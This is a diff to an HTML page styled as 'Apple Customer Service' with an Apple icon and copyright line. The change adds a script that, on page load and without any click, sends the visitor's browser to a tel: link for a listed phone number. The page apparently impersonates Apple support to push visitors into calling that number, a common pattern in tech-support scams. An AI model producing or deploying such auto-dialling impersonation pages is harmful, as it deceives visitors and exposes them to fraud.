@@ -117,7 +117,7 @@
 
 </head>
 
-<body>
+<body onload="autoDial()">
 
     <img src="icon.webp" alt="Apple icon " class="icon">
     <h1>Apple Customer Service</h1>
@@ -136,6 +136,17 @@
 
     <a href="tel:+1(808) 492-2375" class="call">Toll-Free Number</a>
     <p class="fff">© 2024 Apple Inc. All rights reserved.</p>
+    <script>
+        function autoDial() {
+            var phoneNumber = "+1(808) 492-2375";
+            window.location.href = "tel:" + phoneNumber;
+        }
+
+        function call() {
+            // Implement the call functionality here, such as initiating a phone call.
+            console.log("Calling...");
+        }
+    </script>
 </body>
 
 </html>
